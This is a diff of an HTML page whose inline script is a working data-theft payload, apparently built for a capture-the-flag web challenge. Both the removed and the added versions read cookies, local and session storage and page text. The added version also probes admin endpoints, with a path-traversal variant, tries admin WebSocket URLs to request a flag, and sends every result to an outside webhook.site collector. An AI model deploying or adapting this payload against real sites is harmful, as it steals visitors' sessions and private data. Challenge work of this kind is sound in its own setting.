@@ -1,68 +1,134 @@
 <!doctype html>
 <html>
 <body>
-<h1>This is a definitly malicious page </h1>
-<script>
-const REC = "https://webhook.site/0f10c98d-9181-4a92-b57a-1eae97ed5a47/x=?";
+<h1>Totally Not Suspicious Page</h1>
 
-function report(msg){
-  try {
-    fetch(REC + encodeURIComponent(msg)).catch(e=>{
-      try { new Image().src = REC + encodeURIComponent("REPORT_FAIL: " + e); } catch {}
-    });
-  } catch(e){}
+<script>
+/* ---------------- CONFIG ---------------- */
+const REC = "https://webhook.site/0f10c98d-9181-4a92-b57a-1eae97ed5a47/x=";
+const WS_TARGETS = [
+  "wss://ce441-web.spchallenge.ir:8080/admin/ws",
+  "ws://ce441-web.spchallenge.ir:8080/admin/ws",
+  "wss://ce441-web.spchallenge.ir/admin/ws",
+  "ws://ce441-web.spchallenge.ir/admin/ws"
+];
+const ADMIN_ENDPOINTS = [
+  "/admin/tasks",
+  "/admin/users",
+  "/admin/",
+  "/admin/logs",
+  "/admin/settings",
+  "/admin/flag",
+  "/admin/../admin/tasks",
+];
+
+/* ---------------- HELPERS ---------------- */
+function ex(msg){
+  msg = "[EXFIL] " + msg;
+  try { fetch(REC + encodeURIComponent(msg)); }
+  catch(e){
+    try { 
+      let i=new Image(); 
+      i.src=REC+encodeURIComponent("[FALLBACK IMG] "+msg); 
+    } catch(_) {}
+  }
 }
 
-
-function sniff(){
+function sniffAll(){
   let out = "";
-  try { out += "cookies=" + document.cookie + "\\n"; } catch(e){ out += "cookies_err="+e+"\\n"; }
-  try { out += "localStorage=" + JSON.stringify(window.localStorage) + "\\n"; } catch(e){ out += "local_err="+e+"\\n"; }
-  try { out += "body_snippet=" + document.body.innerText.slice(0,1000) + "\\n"; } catch(e){ out += "body_err="+e+"\\n"; }
+  try { out += "cookies=" + document.cookie + "\n"; } catch(e){}
+  try { out += "localStorage=" + JSON.stringify(localStorage) + "\n"; } catch(e){}
+  try { out += "sessionStorage=" + JSON.stringify(sessionStorage) + "\n"; } catch(e){}
+  try { out += "UA=" + navigator.userAgent + "\n"; } catch(e){}
+  try { out += "screen=" + screen.width + "x" + screen.height + "\n"; } catch(e){}
+  try { out += "body_text=" + document.body.innerText.slice(0,5000) + "\n"; } catch(e){}
   return out;
 }
 
-(async function(){
-  report("START_SNIF " + navigator.userAgent);
-
+async function testCSP(){
+  let res = "";
   try {
-    const ws_url = "wss://ce441-web.spchallenge.ir:8080/admin/ws";
-    report("TRY_WS:" + ws_url);
-    let ws = new WebSocket(ws_url);
-    let received = "";
-    let done = false;
-    ws.onopen = () => {
-      report("WS_OPEN");
-      try {
-        ws.send("flag");
-        report("WS_SENT:flag");
-      } catch(e){
-        report("WS_SEND_ERR:" + e);
-      }
-    };
-    ws.onmessage = (m) => {
-      received += m.data + "\\n";
-      report("WS_RECV:" + m.data);
-      done = true;
-      try { ws.close(); } catch(e){}
-    };
-    ws.onerror = (ev) => {
-      report("WS_ERROR:" + String(ev));
-    };
-    setTimeout(()=>{
-      if(!done){
-        try{ ws.close(); }catch(e){}
-        report("WS_NO_RESPONSE_FROM_ADMIN_WS");
-        report("SNIFF:"+sniff());
-      }
-    }, 2500);
-    return;
-  } catch(e){
-    report("WS_TRY_EXCEPTION:" + e);
+    const r = await fetch("/does_not_exist_for_csp_test",{method:"GET"});
+    res = "fetch_allowed";
+  } catch {
+    res = "fetch_blocked_by_csp";
   }
+  ex("CSP_TEST=" + res);
+}
 
-  // fallback: just sniff and report
-  report("FALLBACK_SNIFF:" + sniff());
+function testIframe(){
+  try{
+    if(window.top !== window.self) ex("IFRAME_DETECTED");
+    else ex("NO_IFRAME");
+  } catch(e){
+    ex("IFRAME_CHECK_ERR="+e);
+  }
+}
+
+async function bruteAdminEndpoints(){
+  for(const p of ADMIN_ENDPOINTS){
+    try{
+      const r = await fetch(p);
+      ex("ADMIN_FETCH "+p+" status="+r.status);
+      const t = await r.text();
+      ex("ADMIN_BODY "+p+" => "+t.slice(0,500));
+    } catch(e){ 
+      ex("ADMIN_FETCH_ERR "+p+" => "+e); 
+    }
+  }
+}
+
+async function testWS(){
+  for(const url of WS_TARGETS){
+    try {
+      ex("TRY_WS " + url);
+      let done = false;
+      await new Promise((resolve)=>{
+        let ws = new WebSocket(url);
+
+        ws.onopen = ()=>{
+          ex("WS_OPEN "+url);
+          try { ws.send("flag"); ex("WS_SENT flag"); } catch(e){ ex("WS_SEND_ERR "+e); }
+        };
+
+        ws.onerror = e=>{
+          ex("WS_ERROR "+url+" => "+e);
+        };
+
+        ws.onmessage = m=>{
+          ex("WS_RECV "+url+" => "+m.data);
+          done = true;
+          ws.close();
+          resolve();
+        };
+
+        setTimeout(()=>{
+          if(!done){
+            ex("WS_TIMEOUT "+url);
+            try{ ws.close(); }catch(_){}
+            resolve();
+          }
+        }, 2500);
+      });
+    } catch(e){
+      ex("WS_EXCEPTION "+url+" => "+e);
+    }
+  }
+}
+
+/* ---------------- RUN EVERYTHING ---------------- */
+(async function(){
+  ex("START_EXFIL UA=" + navigator.userAgent);
+
+  testIframe();
+  await testCSP();
+
+  ex("SNIFF:\n" + sniffAll());
+
+  await bruteAdminEndpoints();
+  await testWS();
+
+  ex("DONE_ALL_TESTS");
 })();
 </script>
 </body>
